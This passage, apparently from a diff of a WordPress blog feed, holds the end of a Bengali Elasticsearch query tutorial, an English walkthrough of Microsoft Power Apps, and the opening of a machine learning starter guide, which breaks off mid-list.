+<li style="font-weight: 400;" aria-level="2"><span style="font-weight: 400;">geographically কোন aggregated data পাওয়ার জন্য </span></li>
+<li style="font-weight: 400;" aria-level="2"><span style="font-weight: 400;">distance এর ভিত্তিতে sort করার জন্য </span></li>
+<li style="font-weight: 400;" aria-level="2"><span style="font-weight: 400;">multipolygon দিয়ে search করে data পাওয়ার জন্য </span></li>
+</ul>
+</li>
+<li style="font-weight: 400;" aria-level="1"><b>geo_shape</b><span style="font-weight: 400;">  &#8211; যে কোন latitude এবং longitude এর shape store করার জন্য এটি ব্যবহার করা যায়, যেমন &#8211; polygon, multipolygon অথবা যে কোন ধরণের shape, যা দিয়ে পরবর্তীতে geo_point এর উপর search operation চালিয়ে data পাওয়া যায়</span></li>
+</ul>
+<p><span style="font-weight: 400;">আরো অনেক ধরনের data type আছে, দয়া করে নিজ দায়িত্বে দেখে নিবেন elasticsearch documentation এ</span></p>
+<h3><b>DSL query</b></h3>
+<p><span style="font-weight: 400;"> </span><span style="font-weight: 400;">DSL (Domain specific language) হল JSON based query language. DSL query দুইটা context এর উপর রান করে &#8211; </span><b><i>query</i></b><span style="font-weight: 400;">, </span><b><i>filter</i></b></p>
+<ul>
+<li><span style="font-weight: 400;">Query context: এই context টার মূল লক্ষ্য হল, একটা query এর response কতটা match করবে এবং relevant হবে। document এ _score নামে একটা meta field থাকে, যেখানে একটা number থাকে, যেই document এর </span><i><span style="font-weight: 400;">_score</span></i><span style="font-weight: 400;"> যত বেশি সেইটা ততটা match করেছে এবং সেইটা সবচেয়ে relevant</span></li>
+<li><span style="font-weight: 400;">Filter context: এই context মূলত কোন কিছু filter করে আনার জন্য, match করতে ও পারে আবার না ও পারে। এই context এর কোন _score নেই এবং এটি ব্যবহার করা হয় structure data filter করার জন্য। filter context frequent call হলে, elasticsearch তা cache করে রাখে performance বাড়ানোর জন্য। </span></li>
+</ul>
+<p><span style="font-weight: 400;">Query এবং filter context এর একটি উদাহরণ &#8211;</span></p>
+<ul>
+<li style="font-weight: 400;" aria-level="1"><span style="font-weight: 400;">title ফিল্ড এ Database নামের একটা word (text data type) থাকবে </span></li>
+<li style="font-weight: 400;" aria-level="1"><span style="font-weight: 400;">content field এ Elasticsearch নামের একটা word (text data type) থাকবে</span></li>
+<li style="font-weight: 400;" aria-level="1"><span style="font-weight: 400;">status field এ published নামের একটা exact word (keyword data type) থাকবে</span></li>
+<li style="font-weight: 400;" aria-level="1"><span style="font-weight: 400;">published_date এ একটা date (date data type) থাকবে </span></li>
+</ul>
+<pre class="EnlighterJSRAW" data-enlighter-language="json">GET posts/_search
+
+{
+
+  "query": { 
+
+    "bool": { 
+
+      "must": [
+
+        { "match": { "title":   "Database" }},
+
+        { "match": { "content":   "Elasticsearch" }}
+
+      ],
+
+      "filter": [ 
+
+        { "term":  { "status": "published" }},
+
+        { "range": { "publish_date": { "gte": "2015-01-01" }}}
+
+      ]
+
+    }
+
+  }
+
+}</pre>
+<p>&nbsp;</p>
+<ul>
+<li style="font-weight: 400;" aria-level="1"><span style="font-weight: 400;">এইখানে query parameter টা query context কে বুজাচ্ছে </span></li>
+<li style="font-weight: 400;" aria-level="1"><span style="font-weight: 400;">bool এবং match ব্যবহার করা হচ্ছে query context এ যাতে কতটা ভালো ভাবে match হয়েছে তার উপর ভিত্তি করে  _score আসে</span></li>
+<li style="font-weight: 400;" aria-level="1"><span style="font-weight: 400;">filter parameter দিয়ে filter context বুঝানো হচ্ছে, term এবং range query দিয়ে docuent filter করে আনা হচ্ছে, এতে query context এর _score এর কোন সমস্যা হবে না। </span></li>
+</ul>
+<h3><b>Compound queries</b></h3>
+<p><span style="font-weight: 400;">এক বা একাধিক leaf queries অথবা compound query এর সমন্বয়ে compound query তৈরী হয়। সহজ ভাষায় বলতে গেলে bool, boosting অথবা এই ধরণের আরো কিছু scope এ যখন কোন query কে group করা হয়। </span></p>
+<ul>
+<li style="font-weight: 400;" aria-level="1"><span style="font-weight: 400;">Bool &#8211; document গুলা query তে match করে আসবে কি আসবে না তার একটা boolean combination. bool এর ভিতর must, must_not, should, filter ব্যবহার করা হয়</span>
+<ul>
+<li style="font-weight: 400;" aria-level="2"><span style="font-weight: 400;">must &#8211; যেই clause গুলা match করতেই হবে, সেইগুলা must দিয়ে ব্যবহার করা যায় </span></li>
+<li style="font-weight: 400;" aria-level="2"><span style="font-weight: 400;">must_not &#8211; যেই clause গুলা ম্যাচ করবে না,  সেইগুলা must_not এ রাখা হয়</span></li>
+<li style="font-weight: 400;" aria-level="2"><span style="font-weight: 400;">should &#8211; যখন কোন additional value দিয়ে match এর relevency বাড়িয়ে _score বাড়ানো হয় তখন should ব্যবহার করা হয়  </span></li>
+</ul>
+</li>
+</ul>
+<h3><b>Match query</b></h3>
+<p><span style="font-weight: 400;">যখন word / sentence দিয়ে কোন content search করার প্রয়োজন হয় তখন match query দিয়ে full text search করা যায়। field এর data type text হতে হবে </span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="json">GET posts/_search
+
+{
+
+  "query": {
+
+    "match": {
+
+      "body": {
+
+        "query": "elasticsearch is fast"
+
+      }
+
+    }
+
+  }
+
+}</pre>
+<p>&nbsp;</p>
+<p><span style="font-weight: 400;">Match query বিভিন্ন ভাবে করা যায়, documentation বিস্তারিত বলা আছে, আমি শুধু প্রাথমিক ধারণা দিয়েছি</span></p>
+<h3><b>Term query</b></h3>
+<p><span style="font-weight: 400;">যখন exact match প্রয়োজন হয় তখন term query করা হয়, এই ক্ষেত্রে field এর data type keyword হতে হবে</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="json">GET posts/_search
+
+{
+
+  "query": {
+
+    "match": {
+
+      "body": {
+
+        "query": "elasticsearch is fast"
+
+      }
+
+    },
+
+    "term": {
+
+      "is_published": {
+
+        "value": true
+
+      }
+
+    }
+
+  }
+
+}</pre>
+<h3><b>Range query</b></h3>
+<p><span style="font-weight: 400;">যখন কোন range এর ভিতরে search করার প্রয়োজন হয় তখন এই query ব্যবহার করা যায়, যেমন &#8211; numeric value অথবা date এর range</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="json">GET populations/_search
+
+{
+
+  "query": {
+
+    "range": {
+
+      "age": {
+
+        "gte": 10,
+
+        "lte": 20
+
+      }
+
+    }
+
+  }
+
+}</pre>
+<h3><b>Geo distance query</b></h3>
+<p><span style="font-weight: 400;">কোন geo_point থেকে নির্দিষ্ট radius এ geolocation based search করার জন্য এই query ব্যবহার করা হয়ে থাকে। </span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="json">GET /locations/_search
+
+{
+
+  "query": {
+
+    "bool": {
+
+      "must": {
+
+        "match_all": {}
+
+      },
+
+      "filter": {
+
+        "geo_distance": {
+
+          "distance": "20km",
+
+          "pin.location": {
+
+            "lat": 40,
+
+            "lon": -70
+
+          }
+
+        }
+
+      }
+
+    }
+
+  }
+
+}</pre>
+<h3><b>Geo shape query</b></h3>
+<p><span style="font-weight: 400;">কোন geo_point এর উপর polygon অথবা multipolygon দিয়ে search করে documents পাওয়ার জন্য geo_shape কোয়েরি করা হয়। ধরা যাক, বনানী এলাকার ভিতরে সব হসপিটাল এর documents লাগবে (হসপিটাল এর geo_point গুলা আগে থেকে ingest করা আছে), তখন বনানী এলাকার multipolygon দিয়ে search করলে সব গুলা documents পাওয়া সম্ভব। </span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="json">GET /hospitals/_search
+
+{
+
+  "query": {
+
+    "bool": {
+
+      "must": {
+
+        "match_all": {}
+
+      },
+
+      "filter": {
+
+        "geo_shape": {
+
+          "location": {
+
+            "shape": {
+
+              "type": "multipolygon",
+
+              "coordinates": [ [ 13.0, 53.0 ], [ 14.0, 52.0 ] ]
+
+            }
+
+          }
+
+        }
+
+      }
+
+    }
+
+  }
+
+}</pre>
+<h2><b>শেষের কথা</b></h2>
+<p><span style="font-weight: 400;">আমি চেষ্টা করেছি সহজ ভাবে বলার এবং শক্ত কথা গুলা এড়িয়ে যাওয়ার, elasticsearch বেশ বড় একটা বিষয়, এর মধ্যে আরো অনেক কিছু আছে, আমি শুধু কিছু প্রাথমিক আলোচনা করার চেষ্টা করেছি। আমার আলোচনার বাহিরে আরো অনেক বিষয় আছে যেমন &#8211; </span><b>aggregation</b><span style="font-weight: 400;"> (মেট্রিক্স দেখানোর জন্য অনেক কাজের একটা জিনিস), </span><b>kibana</b><span style="font-weight: 400;"> (data visualization এর জন্য), </span><b>logstash</b><span style="font-weight: 400;"> (data migration এর কাজে লাগে) এবং আরো অনেক কিছু, যা নিয়ে আলোচনা করা হয় নাই। নিজ গুনে দেখে নেয়ার জন্য অনুরুধ করা হলো।</span></p>
+]]></content:encoded>
+					
+		
+		
+			</item>
+		<item>
+		<title>Microsoft Power Platform: Power Apps</title>
+		<link>/blog/microsoft-power-platform-power-apps/</link>
+		
+		<dc:creator><![CDATA[Khairul Alam]]></dc:creator>
+		<pubDate>Wed, 28 Sep 2022 11:33:41 +0000</pubDate>
+				<category><![CDATA[Data]]></category>
+		<category><![CDATA[Programming & Development]]></category>
+		<category><![CDATA[Technology]]></category>
+		<guid isPermaLink="false">/?p=11969</guid>
+
+					<description><![CDATA[Microsoft Power Platform is a group of business intelligence, app development and app connectivity software applications. Power Platform integration lets us create apps and flows by using the new Power Platform environment that is automatically created for you. Integrate finance and operations apps data with the Dataverse platform by using virtual tables, business events, and [&#8230;]]]></description>
+										<content:encoded><![CDATA[<p><strong>Microsoft Power Platform</strong> is a group of business intelligence, app development and app connectivity software applications. Power Platform integration lets us create apps and flows by using the new Power Platform environment that is automatically created for you. Integrate finance and operations apps data with the Dataverse platform by using virtual tables, business events, and dual-write features. Microsoft developed the Power Fx low-code programming language for expressing logic across the Power Platform. It also provides integrations with GitHub, Teams etc.</p>
+<p>Microsoft Power Platform is combination of four key products: Power Apps, Power Automate, Power BI and Power Virtual Agents-</p>
+<ul>
+<li><strong>Power Apps</strong> provides a rapid low code or no code development environment for building custom apps for business needs. It has services, connectors(built in + custom), a scalable data service and app platform (Microsoft Dataverse) to allow simple integration and interaction with existing data. Power Apps enables the creation of web and mobile applications that run on all devices. Power Apps eases users into app development with a simple interface so that every business user or pro developer can build custom apps. Power Apps integration allows you to connect data from multiple services and dashboards, including Outlook, OneDrive,PowerPoint, Excel, SharePoint, Dynamics 365, Salesforce, Dropbox, and others.<br />
+<img decoding="async" class="aligncenter size-full wp-image-12044" src="/wp-content/uploads/2022/09/c1.jpg" alt="c1 Microsoft Power Platform: Power Apps" width="908" height="577" srcset="/wp-content/uploads/2022/09/c1.jpg 908w, /wp-content/uploads/2022/09/c1-480x305.jpg 480w" sizes="(min-width: 0px) and (max-width: 480px) 480px, (min-width: 481px) 908px, 100vw"></p>
+<ul>
+<li><strong>Canvas app </strong>is one of the main types of applications that you can create in PowerApps. It gives you a blank canvas and allows you to design the form, also it allows you to connect with many types of data sources. If you want to make your own design, then the Canvas app is the best choice for you. The Canvas app provides you with a blank canvas and you will design your app screen-by-screen, which means that you will have full control of building your own design.<br />
+<img decoding="async" class="aligncenter size-full wp-image-12045" src="/wp-content/uploads/2022/09/canvas.png" alt="canvas Microsoft Power Platform: Power Apps" width="1923" height="937" srcset="/wp-content/uploads/2022/09/canvas.png 1923w, /wp-content/uploads/2022/09/canvas-1280x624.png 1280w, /wp-content/uploads/2022/09/canvas-980x478.png 980w, /wp-content/uploads/2022/09/canvas-480x234.png 480w" sizes="(min-width: 0px) and (max-width: 480px) 480px, (min-width: 481px) and (max-width: 980px) 980px, (min-width: 981px) and (max-width: 1280px) 1280px, (min-width: 1281px) 1923px, 100vw"></li>
+<li><strong>Model-driven app</strong> is another app type that you can create in PowerApps. Unlike the Canvas App, the PowerApps will design the appearance of your Model-driven app according to the data you will add to your app. If you don’t have a custom design and your data is in Data Verse ” common data service before” then you should choose the model-driven app.<br />
+<img decoding="async" class="aligncenter size-full wp-image-12046" src="/wp-content/uploads/2022/09/model-drivem.png" alt="model drivem Microsoft Power Platform: Power Apps" width="2736" height="1463" srcset="/wp-content/uploads/2022/09/model-drivem.png 2736w, /wp-content/uploads/2022/09/model-drivem-1280x684.png 1280w, /wp-content/uploads/2022/09/model-drivem-980x524.png 980w, /wp-content/uploads/2022/09/model-drivem-480x257.png 480w" sizes="(min-width: 0px) and (max-width: 480px) 480px, (min-width: 481px) and (max-width: 980px) 980px, (min-width: 981px) and (max-width: 1280px) 1280px, (min-width: 1281px) 2736px, 100vw"></li>
+<li><strong>Portal </strong>is an external-facing website that enables users outside their organizations to sign in to create and view data. Also, the Portal App provides viewing the content anonymously. When you want to create websites that can be accessed by external users with a wide variety of identities including personal accounts, LinkedIn, and other Azure Active Directory organizations, and enable anonymous access to content, then you will use Portal App.<br />
+<img decoding="async" class="aligncenter size-full wp-image-12047" src="/wp-content/uploads/2022/09/portal.png" alt="portal Microsoft Power Platform: Power Apps" width="1918" height="935" srcset="/wp-content/uploads/2022/09/portal.png 1918w, /wp-content/uploads/2022/09/portal-1280x624.png 1280w, /wp-content/uploads/2022/09/portal-980x478.png 980w, /wp-content/uploads/2022/09/portal-480x234.png 480w" sizes="(min-width: 0px) and (max-width: 480px) 480px, (min-width: 481px) and (max-width: 980px) 980px, (min-width: 981px) and (max-width: 1280px) 1280px, (min-width: 1281px) 1918px, 100vw"></li>
+</ul>
+</li>
+<li><strong>Power Automate</strong> allows users create automated workflows between applications and services. It helps automate repetitive business processes such as communication, data collections, and decision approvals.Don&#8217;t waste important productive hours on drafting the same email for a weekly update or walking approvals through. Not only for the individual user, Power Automate allows for the creation of enterprise-grade process automation. Power Automate&#8217;s simple interface allows every level of user to automate work tasks &#8211; from beginners to seasoned developers.</li>
+<li><strong>Power BI </strong>(Business Intelligence) is a business analytics service that delivers insights for analyzing data. It can share those insights through data visualizations which make up reports and dashboards to enable fast, informed decisions. Power BI scales across an organization, and it has built-in governance and security allowing businesses to focus on using data more than managing it.<br />
+You can consider Power BI as the analysis and insights leg of Microsoft Power Platform. It takes business data and allows you to display it in ways that makes the most sense to users. A Power BI dashboard could potentially replace a standing meeting to report out on company metrics such as sales data, progress against goals, or employee performance.</li>
+<li><strong>Power Virtual Agents </strong>enables anyone to create powerful chatbots using a guided, no-code graphical interface, without the need for data scientists or developers.<br />
+It minimizes the IT effort required to deploy and maintain a custom solution by empowering subject matter experts to build and maintain their own conversational solutions. Power Virtual Agents is part of Microsoft Power Platform, therefore integration into existing systems is streamlined with out-of-the-box integration with Power Automate and its ecosystems of hundreds of connectors. Users can enable chatbots to perform an action by simply calling a Power Automate flow. Flows help users automate activities or call back end systems. Users can utilize existing flows that have been created in their Power Apps environment or they can create a flow within Power Virtual Agents authoring canvas.</li>
+</ul>
+<p>Among the programs listed above, there are cross cutting features which enable Microsoft Power Platform to be leveraged to its full potential. Some of these are:</p>
+<ul>
+<li><strong>AI Builder</strong> lets users and developers add AI capabilities to the workflows and Power Apps they create and use. AI Builder is a turnkey solution that allows you to easily add intelligence to your workflows and apps and predict outcomes to help improve business performance without writing code.</li>
+<li><strong>Microsoft Dataverse</strong> is scalable data service and app platform which lets users securely store and manage data from multiple sources and integrate that data in business applications using a common data model to ensure ease and consistency to users. Microsoft Dataverse is the common currency that enables the components of Microsoft Power Platform to work together. It’s the foundation that enables the consolidation, display, and manipulation of data.</li>
+<li><strong>Connectors</strong> enable you to connect apps, data, and devices in the cloud. Consider connectors the bridge across which information and commands travel. There are more than 600 connectors for Microsoft Power Platform, enabling all of your data and actions to connect cohesively. Examples of popular connectors include Salesforce, Office 365, Twitter, Dropbox, Google services, and more.</li>
+</ul>
+<p>Want to see how easy and fast it is to create a Power Apps? Let&#8217;s create a canvas app with data from an Excel file.</p>
+<ul>
+<li>Sign in to <a href="https://make.powerapps.com/?utm_source=padocs&amp;utm_medium=linkinadoc&amp;utm_campaign=referralsfromdoc" data-linktype="external" rel="nofollow noopener" target="_blank">Power Apps</a>.<br />
+<img decoding="async" class="aligncenter size-full wp-image-12049" src="/wp-content/uploads/2022/09/Capture1-1.png" alt="Capture1 1 Microsoft Power Platform: Power Apps" width="1920" height="849" srcset="/wp-content/uploads/2022/09/Capture1-1.png 1920w, /wp-content/uploads/2022/09/Capture1-1-1280x566.png 1280w, /wp-content/uploads/2022/09/Capture1-1-980x433.png 980w, /wp-content/uploads/2022/09/Capture1-1-480x212.png 480w" sizes="(min-width: 0px) and (max-width: 480px) 480px, (min-width: 481px) and (max-width: 980px) 980px, (min-width: 981px) and (max-width: 1280px) 1280px, (min-width: 1281px) 1920px, 100vw"></li>
+<li>Click on create and select Excel<br />
+<img decoding="async" class="aligncenter size-full wp-image-12051" src="/wp-content/uploads/2022/09/Capture2-1.png" alt="Capture2 1 Microsoft Power Platform: Power Apps" width="1917" height="937" srcset="/wp-content/uploads/2022/09/Capture2-1.png 1917w, /wp-content/uploads/2022/09/Capture2-1-1280x626.png 1280w, /wp-content/uploads/2022/09/Capture2-1-980x479.png 980w, /wp-content/uploads/2022/09/Capture2-1-480x235.png 480w" sizes="(min-width: 0px) and (max-width: 480px) 480px, (min-width: 481px) and (max-width: 980px) 980px, (min-width: 981px) and (max-width: 1280px) 1280px, (min-width: 1281px) 1917px, 100vw"></li>
+<li>Select Google Drive as Source connection then click on Create button<br />
+<img decoding="async" class="aligncenter size-full wp-image-12056" src="/wp-content/uploads/2022/09/Capture3-1.png" alt="Capture3 1 Microsoft Power Platform: Power Apps" width="1918" height="934" srcset="/wp-content/uploads/2022/09/Capture3-1.png 1918w, /wp-content/uploads/2022/09/Capture3-1-1280x623.png 1280w, /wp-content/uploads/2022/09/Capture3-1-980x477.png 980w, /wp-content/uploads/2022/09/Capture3-1-480x234.png 480w" sizes="(min-width: 0px) and (max-width: 480px) 480px, (min-width: 481px) and (max-width: 980px) 980px, (min-width: 981px) and (max-width: 1280px) 1280px, (min-width: 1281px) 1918px, 100vw"></li>
+<li>Select your source Excel file and click on Connect button, You can download the example file from here <a href="https://az787822.vo.msecnd.net/documentation/get-started-from-data/FlooringEstimates.xlsx" data-linktype="external" rel="nofollow noopener" target="_blank">Flooring Estimates </a><br />
+<img decoding="async" class="aligncenter size-full wp-image-12059" src="/wp-content/uploads/2022/09/Capture6.png" alt="Capture6 Microsoft Power Platform: Power Apps" width="1920" height="936" srcset="/wp-content/uploads/2022/09/Capture6.png 1920w, /wp-content/uploads/2022/09/Capture6-1280x624.png 1280w, /wp-content/uploads/2022/09/Capture6-980x478.png 980w, /wp-content/uploads/2022/09/Capture6-480x234.png 480w" sizes="(min-width: 0px) and (max-width: 480px) 480px, (min-width: 481px) and (max-width: 980px) 980px, (min-width: 981px) and (max-width: 1280px) 1280px, (min-width: 1281px) 1920px, 100vw"></li>
+<li>Your App is now ready to run, Click on run button<br />
+<img decoding="async" class="aligncenter size-full wp-image-12060" src="/wp-content/uploads/2022/09/Capture7.png" alt="Capture7 Microsoft Power Platform: Power Apps" width="1920" height="935" srcset="/wp-content/uploads/2022/09/Capture7.png 1920w, /wp-content/uploads/2022/09/Capture7-1280x623.png 1280w, /wp-content/uploads/2022/09/Capture7-980x477.png 980w, /wp-content/uploads/2022/09/Capture7-480x234.png 480w" sizes="(min-width: 0px) and (max-width: 480px) 480px, (min-width: 481px) and (max-width: 980px) 980px, (min-width: 981px) and (max-width: 1280px) 1280px, (min-width: 1281px) 1920px, 100vw"><img decoding="async" class="aligncenter size-full wp-image-12061" src="/wp-content/uploads/2022/09/Capture8.png" alt="Capture8 Microsoft Power Platform: Power Apps" width="1412" height="927" srcset="/wp-content/uploads/2022/09/Capture8.png 1412w, /wp-content/uploads/2022/09/Capture8-1280x840.png 1280w, /wp-content/uploads/2022/09/Capture8-980x643.png 980w, /wp-content/uploads/2022/09/Capture8-480x315.png 480w" sizes="(min-width: 0px) and (max-width: 480px) 480px, (min-width: 481px) and (max-width: 980px) 980px, (min-width: 981px) and (max-width: 1280px) 1280px, (min-width: 1281px) 1412px, 100vw"> <img decoding="async" class="aligncenter size-full wp-image-12062" src="/wp-content/uploads/2022/09/Capture9.png" alt="Capture9 Microsoft Power Platform: Power Apps" width="1417" height="937" srcset="/wp-content/uploads/2022/09/Capture9.png 1417w, /wp-content/uploads/2022/09/Capture9-1280x846.png 1280w, /wp-content/uploads/2022/09/Capture9-980x648.png 980w, /wp-content/uploads/2022/09/Capture9-480x317.png 480w" sizes="(min-width: 0px) and (max-width: 480px) 480px, (min-width: 481px) and (max-width: 980px) 980px, (min-width: 981px) and (max-width: 1280px) 1280px, (min-width: 1281px) 1417px, 100vw"> <img decoding="async" class="aligncenter size-full wp-image-12063" src="/wp-content/uploads/2022/09/Capture10.png" alt="Capture10 Microsoft Power Platform: Power Apps" width="1414" height="939" srcset="/wp-content/uploads/2022/09/Capture10.png 1414w, /wp-content/uploads/2022/09/Capture10-1280x850.png 1280w, /wp-content/uploads/2022/09/Capture10-980x651.png 980w, /wp-content/uploads/2022/09/Capture10-480x319.png 480w" sizes="(min-width: 0px) and (max-width: 480px) 480px, (min-width: 481px) and (max-width: 980px) 980px, (min-width: 981px) and (max-width: 1280px) 1280px, (min-width: 1281px) 1414px, 100vw"></li>
+<li>To publish the app click on publish icon from top right corner<br />
+<img decoding="async" class="aligncenter size-full wp-image-12064" src="/wp-content/uploads/2022/09/Capture11.0.png" alt="Capture11.0 Microsoft Power Platform: Power Apps" width="1918" height="937" srcset="/wp-content/uploads/2022/09/Capture11.0.png 1918w, /wp-content/uploads/2022/09/Capture11.0-1280x625.png 1280w, /wp-content/uploads/2022/09/Capture11.0-980x479.png 980w, /wp-content/uploads/2022/09/Capture11.0-480x234.png 480w" sizes="(min-width: 0px) and (max-width: 480px) 480px, (min-width: 481px) and (max-width: 980px) 980px, (min-width: 981px) and (max-width: 1280px) 1280px, (min-width: 1281px) 1918px, 100vw"><img decoding="async" class="aligncenter size-full wp-image-12065" src="/wp-content/uploads/2022/09/Capture11.png" alt="Capture11 Microsoft Power Platform: Power Apps" width="1918" height="936" srcset="/wp-content/uploads/2022/09/Capture11.png 1918w, /wp-content/uploads/2022/09/Capture11-1280x625.png 1280w, /wp-content/uploads/2022/09/Capture11-980x478.png 980w, /wp-content/uploads/2022/09/Capture11-480x234.png 480w" sizes="(min-width: 0px) and (max-width: 480px) 480px, (min-width: 481px) and (max-width: 980px) 980px, (min-width: 981px) and (max-width: 1280px) 1280px, (min-width: 1281px) 1918px, 100vw"></li>
+<li>Now you can share the app to your users, To share click on share icon from top right corner<br />
+<img decoding="async" class="aligncenter size-full wp-image-12067" src="/wp-content/uploads/2022/09/Capture13.0.png" alt="Capture13.0 Microsoft Power Platform: Power Apps" width="1920" height="934" srcset="/wp-content/uploads/2022/09/Capture13.0.png 1920w, /wp-content/uploads/2022/09/Capture13.0-1280x623.png 1280w, /wp-content/uploads/2022/09/Capture13.0-980x477.png 980w, /wp-content/uploads/2022/09/Capture13.0-480x234.png 480w" sizes="(min-width: 0px) and (max-width: 480px) 480px, (min-width: 481px) and (max-width: 980px) 980px, (min-width: 981px) and (max-width: 1280px) 1280px, (min-width: 1281px) 1920px, 100vw"><img decoding="async" class="aligncenter size-full wp-image-12066" src="/wp-content/uploads/2022/09/Capture13.png" alt="Capture13 Microsoft Power Platform: Power Apps" width="1920" height="937" srcset="/wp-content/uploads/2022/09/Capture13.png 1920w, /wp-content/uploads/2022/09/Capture13-1280x625.png 1280w, /wp-content/uploads/2022/09/Capture13-980x478.png 980w, /wp-content/uploads/2022/09/Capture13-480x234.png 480w" sizes="(min-width: 0px) and (max-width: 480px) 480px, (min-width: 481px) and (max-width: 980px) 980px, (min-width: 981px) and (max-width: 1280px) 1280px, (min-width: 1281px) 1920px, 100vw"></li>
+<li>To use the App, Users will find the shared app list in Power Apps Desktop or in Power Apps mobile<br />
+<img decoding="async" class="aligncenter wp-image-12068" src="/wp-content/uploads/2022/09/Capture14.1.jpeg" alt="Capture14.1 Microsoft Power Platform: Power Apps" width="236" height="498"><img decoding="async" class="aligncenter size-full wp-image-12132" src="/wp-content/uploads/2022/09/Capture14-3.png" alt="Capture14 3 Microsoft Power Platform: Power Apps" width="1912" height="1134" srcset="/wp-content/uploads/2022/09/Capture14-3.png 1912w, /wp-content/uploads/2022/09/Capture14-3-1280x759.png 1280w, /wp-content/uploads/2022/09/Capture14-3-980x581.png 980w, /wp-content/uploads/2022/09/Capture14-3-480x285.png 480w" sizes="(min-width: 0px) and (max-width: 480px) 480px, (min-width: 481px) and (max-width: 980px) 980px, (min-width: 981px) and (max-width: 1280px) 1280px, (min-width: 1281px) 1912px, 100vw"><br />
+<img decoding="async" class="aligncenter size-full wp-image-12131" src="/wp-content/uploads/2022/09/Capture15.png" alt="Capture15 Microsoft Power Platform: Power Apps" width="1913" height="1200" srcset="/wp-content/uploads/2022/09/Capture15.png 1913w, /wp-content/uploads/2022/09/Capture15-1280x803.png 1280w, /wp-content/uploads/2022/09/Capture15-980x615.png 980w, /wp-content/uploads/2022/09/Capture15-480x301.png 480w" sizes="(min-width: 0px) and (max-width: 480px) 480px, (min-width: 481px) and (max-width: 980px) 980px, (min-width: 981px) and (max-width: 1280px) 1280px, (min-width: 1281px) 1913px, 100vw"><br />
+Next, Will try to show how to create custom REST connector for a Canvas Apps.<br />
+Thanks&#8230;</li>
+</ul>
+<p>&nbsp;</p>
+<p>&nbsp;</p>
+<p>&nbsp;</p>
+]]></content:encoded>
+					
+		
+		
+			</item>
+		<item>
+		<title>Machine Learning quick start guide for enthusiast</title>
+		<link>/blog/machine-learning-quick-start-guide-for-enthusiast/</link>
+					<comments>/blog/machine-learning-quick-start-guide-for-enthusiast/#respond</comments>
+		
+		<dc:creator><![CDATA[Khairul Alam]]></dc:creator>
+		<pubDate>Fri, 16 Sep 2022 08:26:45 +0000</pubDate>
+				<category><![CDATA[Data]]></category>
+		<category><![CDATA[Programming & Development]]></category>
+		<category><![CDATA[Technology]]></category>
+		<guid isPermaLink="false">/?p=10277</guid>
+
+					<description><![CDATA[To achieve a better and professional level in Machine Learning as well as a quick start, We have to have some basic and professional level skills and knowledge in some related topics. In this post we will see the related topics, where to start, where the resources are available for study and practice. Understand your [&#8230;]]]></description>
+										<content:encoded><![CDATA[<p>To achieve a better and professional level in Machine Learning as well as a quick start, We have to have some basic and professional level skills and knowledge in some related topics. In this post we will see the related topics, where to start, where the resources are available for study and practice.</p>
+<ul>
+<li><strong>Understand your data first:<br />
+<img decoding="async" class="wp-image-10290 alignnone" src="/wp-content/uploads/2022/09/UntitledDiagram13.png" alt="UntitledDiagram13 Machine Learning quick start guide for enthusiast" width="800" height="290" srcset="/wp-content/uploads/2022/09/UntitledDiagram13.png 800w, /wp-content/uploads/2022/09/UntitledDiagram13-480x174.png 480w" sizes="(min-width: 0px) and (max-width: 480px) 480px, (min-width: 481px) 800px, 100vw"><br />
+</strong>“Data! Data! Data!” he cried impatiently. “I can’t make bricks without clay.” —Arthur Conan Doyle.<br />
+Machine Learning is highly dependent on data, historical data. we are to collect, clean, preprocess (For ML model need numeric data)  the data then  identify and discover the hidden pattern of data to teach the machine. There are basically two types  data &#8211; <strong>Structured</strong> (organized) data, <strong>Unstructured</strong> (unorganized) data.</p>
+<ul>
+<li><span class="TextRun SCXW177857176 BCX0" lang="EN-US" xml:lang="EN-US" data-contrast="auto"><span class="NormalTextRun SCXW177857176 BCX0">These two data types can be defined as follows:</span></span>
+<ul>
+<li><strong>Quantitative data:</strong> This data can be described using numbers, and basic mathematical procedures, including addition, are possible on the set.<br />
+Quantitative/Numeric data can be broken down, one step further, into discrete and continuous quantities. These can be defined as follows:</p>
+<ul>
+<li><strong> Discrete data</strong>: This describes data that is counted. It can only take on certain values. Examples of discrete quantitative data include a dice roll, because it can only take on six values, and the number of customers in a café, because you can&#8217;t have a real range of people.</li>
+<li><strong>Continuous data</strong>: This describes data that is measured. It exists on an infinite range of values.</li>
+</ul>
+</li>
+<li><strong>Qualitative data:</strong> This data cannot be described using numbers and basic mathematics. This data is generally thought of as being described using &#8220;natural&#8221; categories and language.<br />
+Qualitative /Categorical data takes only a fixed set of values, such as a type of TV screen (plasma, LCD, LED, etc.) or a state name (Alabama, Alaska, etc.). Binary data is an important special case of categorical data that takes on only one of two values, such as 0/1, yes/no, or true/false. Another useful type of categorical data is ordinal data in which the categories are ordered; an example of this is a numerical rating (1, 2, 3, 4, or 5)</li>
+</ul>
+</li>
+<li>There also four levels of data to understand:
+<ul>
+<li><strong>The nominal level:</strong> Data at the nominal level is mostly categorical in nature. At the nominal level, we deal with data usually described using vocabulary (but sometimes with numbers), with no order, and little use of mathematics. In order to find the center of nominal data, we generally turn to the mode (the most common element) of the dataset.</li>
+<li><strong>The ordinal level</strong>: At the ordinal level, we have data that can be described with numbers and also have a &#8220;natural&#8221; order, allowing us to put one in front of the other. At the ordinal level, the median is usually an appropriate way of defining the center of the data. The mean, however, would be impossible because division is not allowed at this level.</li>
+<li><strong>The interval level:</strong> Allow Addition, Subtraction. At this level, we can use the median and mode to describe this data; however, usually the most accurate description of the center of data would be the arithmetic mean, more commonly referred to as, simply, &#8220;the mean&#8221;</li>
+<li><strong>The ratio level:</strong> the ratio level proves to be the strongest of the four. Not only can we define order and difference, the ratio level allows us to multiply and divide as well. The arithmetic mean still holds meaning at this level, as does a new type of mean called the geometric mean. Data at the ratio level is usually non-negative.</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<p>Understanding of data will help to collect, clean and pre-process data as per the need to build the ML model</p>
+<ul>
+<li><strong>Programming Langulage &amp; Lybraries:<br />
